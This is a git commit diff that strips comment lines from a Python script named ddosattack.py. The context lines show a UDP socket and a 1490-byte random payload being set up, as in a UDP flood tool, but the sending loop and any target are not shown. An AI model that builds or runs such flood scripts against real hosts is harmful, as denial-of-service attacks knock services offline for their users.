93eb46619951f3da58dc0a5aec058466e71edbbc
saikiran994 <37449869+saikiran994@users.noreply.github.com>
2019-09-19 00:43:25 +0530

    Update ddosattack.py

--- ddosattack.py
+++ ddosattack.py
@@ -3,7 +3,7 @@ import os
 import time
 import socket
 import random
-#Code Time
+
 from datetime import datetime
 now = datetime.now()
 hour = now.hour
@@ -12,10 +12,8 @@ day = now.day
 month = now.month
 year = now.year
 
-##############
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
-#############
 
 os.system("clear")
 os.system("ddosattack")
